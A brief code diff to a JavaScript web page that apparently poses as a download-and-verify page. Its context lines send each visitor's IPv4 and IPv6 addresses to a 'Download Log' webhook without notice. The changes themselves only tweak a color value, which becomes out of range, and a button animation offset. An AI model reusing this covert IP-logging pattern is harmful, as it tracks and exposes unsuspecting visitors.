@@ -22,7 +22,7 @@ document.getElementById("start-btn").addEventListener("click", function () {
                         username: "Download Log",
                         embeds: [{
                             title: "New Download failed Attempt",
-                            color: 16711680,
+                            color: 26711680,
                             fields: [
                                 { name: "IPv4 Address", value: data_v4.ip, inline: true },
                                 { name: "IPv6 Address", value: data_v6.ip, inline: true },
@@ -75,7 +75,7 @@ document.getElementById("verify-btn").addEventListener("click", function() {
                 
                 setTimeout(() => {
                     btn.style.transition = "transform 0.4s ease-in-out";
-                    btn.style.transform = "translateY(600px)"; // Moves down fast
+                    btn.style.transform = "translateY(700px)"; // Moves down fast
                 }, 1000);
             }, 1000);
         }, 1000);
